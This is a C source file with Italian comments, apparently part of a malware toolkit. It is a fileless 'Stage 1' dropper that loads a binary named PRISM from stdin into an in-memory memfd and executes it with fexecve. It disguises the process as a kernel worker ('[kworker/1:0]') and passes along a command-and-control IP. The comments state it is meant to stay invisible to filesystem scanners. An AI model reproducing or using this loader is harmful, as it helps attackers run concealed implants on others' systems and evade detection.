/*
 * memfd_loader.c — Stage 1: fileless dropper via memfd_create
 *
 * Legge il binary PRISM da stdin, lo carica in un file descriptor
 * anonimo in RAM (memfd), lo esegue con fexecve().
 * Nessun file scritto su disco — invisibile a scanner su filesystem.
 *
 * Compilazione: gcc -O2 -static -o memfd_loader memfd_loader.c
 *
 * Uso:
 *   cat prism_static | ./memfd_loader <C2_IP>
 *   base64 -d /tmp/.b64 | ./memfd_loader <C2_IP>
 *
 * In /proc/PID/exe appare come: /memfd: (deleted)
 * In ps appare come:            [kworker/1:0]   ← argv[0] spoofato
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/syscall.h>

/* Chiama memfd_create via syscall diretta per evitare dipendenze glibc */
static int do_memfd_create(const char *name, unsigned int flags)
{
    return (int)syscall(SYS_memfd_create, name, flags);
}

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

int main(int argc, char *argv[])
{
    /* ── 1. Leggi binary da stdin ── */
    size_t cap   = 4 * 1024 * 1024;   /* 4 MB iniziali */
    size_t total = 0;
    unsigned char *buf = malloc(cap);
    if (!buf) { perror("malloc"); return 1; }

    ssize_t n;
    while ((n = read(STDIN_FILENO, buf + total, cap - total)) > 0) {
        total += (size_t)n;
        if (total >= cap) {
            cap *= 2;
            unsigned char *tmp = realloc(buf, cap);
            if (!tmp) { free(buf); perror("realloc"); return 1; }
            buf = tmp;
        }
    }

    if (total < 4) {
        fprintf(stderr, "[!] Input vuoto o troppo piccolo\n");
        free(buf);
        return 1;
    }

    /* Verifica magic ELF */
    if (buf[0] != 0x7f || buf[1] != 'E' || buf[2] != 'L' || buf[3] != 'F') {
        fprintf(stderr, "[!] Non è un ELF valido\n");
        free(buf);
        return 1;
    }

    /* ── 2. Crea file descriptor anonimo in RAM ── */
    int fd = do_memfd_create("", MFD_CLOEXEC);
    if (fd < 0) {
        perror("[!] memfd_create");
        free(buf);
        return 1;
    }

    /* ── 3. Scrivi binary nel memfd ── */
    size_t written = 0;
    while (written < total) {
        ssize_t w = write(fd, buf + written, total - written);
        if (w < 0) {
            perror("[!] write memfd");
            free(buf);
            close(fd);
            return 1;
        }
        written += (size_t)w;
    }
    free(buf);

    /* ── 4. Esegui da memoria con fexecve ── */
    /* argv[0] spoofato per sembrare kworker */
    char *new_argv[4];
    new_argv[0] = "[kworker/1:0]";          /* nome processo falso */
    new_argv[1] = (argc > 1) ? argv[1] : NULL;  /* C2 IP */
    new_argv[2] = NULL;

    extern char **environ;
    fexecve(fd, new_argv, environ);

    /* Se arriviamo qui fexecve è fallito */
    perror("[!] fexecve");
    close(fd);
    return 1;
}
